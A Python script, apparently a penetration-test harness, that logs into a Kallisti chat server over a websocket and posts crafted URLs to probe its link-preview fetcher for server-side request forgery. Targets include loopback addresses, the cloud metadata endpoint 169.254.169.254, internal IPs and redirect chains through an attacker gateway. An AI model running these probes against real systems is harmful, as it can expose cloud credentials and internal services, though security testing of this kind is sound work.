#!/usr/bin/env python3
"""preview_ssrf.py — post attacker URLs via sidecar WS, observe fetcher behavior.
Checks: direct fetch, redirect chains, loopback/metadata/internal targets,
canary hits (proving redirect-follow to arbitrary hosts), preview rendering.
Env: WS_URL, ALICE_CK/ALICE_NAME/ALICE_PASS, GW base for attacker URLs."""
import json
import os
import struct
import time

import websocket
from pymumble_py3.mumble_pb2 import Authenticate, Version

URL = os.environ.get("WS_URL", "ws://127.0.0.1:8080/ws")
GW = os.environ.get("SSRF_GW", "http://169.254.1.2:18901")
R = []


def rec(check, ok, detail=""):
    R.append({"check": check, "ok": bool(ok), "detail": str(detail)[:200]})
    print(("PASS " if ok else "FAIL ") + check + (f" | {detail}"[:150] if detail else ""))


def frame(mtype, msg):
    b = msg.SerializeToString()
    return struct.pack("!HL", mtype, len(b)) + b


def hello(user, pw=""):
    v = Version()
    v.version = (1 << 16) | (5 << 8) | 0
    v.release = "Kallisti"
    v.os = "Web"
    a = Authenticate()
    a.username = user
    a.password = pw
    a.opus = True
    return frame(0, v) + frame(2, a)


def session(cookie, user, pw):
    ws = websocket.create_connection(
        URL, timeout=8, header={"Cookie": f"kallisti_session={cookie}"},
        subprotocols=["kallisti"])
    ws.settimeout(5)
    ws.send_binary(hello(user, pw))
    time.sleep(2)
    for _ in range(8):
        try:
            ws.recv()
        except Exception:
            break
    return ws


def history(ws, channel=1):
    ws.send(json.dumps({"type": "history", "channel": channel}))
    time.sleep(1.5)
    msgs = []
    for _ in range(6):
        try:
            m = ws.recv()
            if isinstance(m, str):
                msgs.append(m)
        except Exception:
            break
    return msgs


if __name__ == "__main__":
    A = os.environ["ALICE_CK"]
    AU = os.environ.get("ALICE_NAME", "ssrfalice")
    AP = os.environ.get("ALICE_PASS", "")
    ws = session(A, AU, AP)

    targets = {
        "direct": f"{GW}/direct",
        "redir-loop": f"{GW}/r-loop",
        "redir-self": f"{GW}/r-self",      # 302 -> 127.0.0.1:8080/api/server (container loopback)
        "redir-canary": f"{GW}/r-canary",  # 302 -> gateway canary (arbitrary host)
        "redir-meta": f"{GW}/r-meta",      # 302 -> 169.254.169.254
        "loopback-direct": "http://127.0.0.1:8080/api/server",
        "localhost-direct": "http://localhost:8080/api/server",
        "zero-direct": "http://0.0.0.0:8080/api/server",
        "meta-direct": "http://169.254.169.254/latest/meta-data/",
        "unroutable": "http://10.255.255.1/x",
        "slow": f"{GW}/slow",
    }
    results = {}
    for name, url in targets.items():
        ws.send(json.dumps({"type": "send", "channel": 1, "text": f"ssrf-{name} {url}",
                            "nonce": f"ssrf-{time.time_ns()}"}))
        time.sleep(6)
        msgs = history(ws)
        blob = " ".join(msgs)
        has_preview = ("ATTACKER-DIRECT" in blob or "preview" in blob.lower()
                       or "title" in blob.lower())
        results[name] = {"url": url, "preview_signals": has_preview,
                         "history_bytes": len(blob)}
        print(f"--- {name}: preview_signals={has_preview} hist={len(blob)}B")
        for m in msgs[-2:]:
            if "ssrf-" + name in m:
                print("   ", m[:250])
    json.dump(results, open("/tmp/ssrf_results.json", "w"), indent=1)
    ws.close()
    print("done; check /tmp/opencode/ssrf_hits.log for fetcher requests")
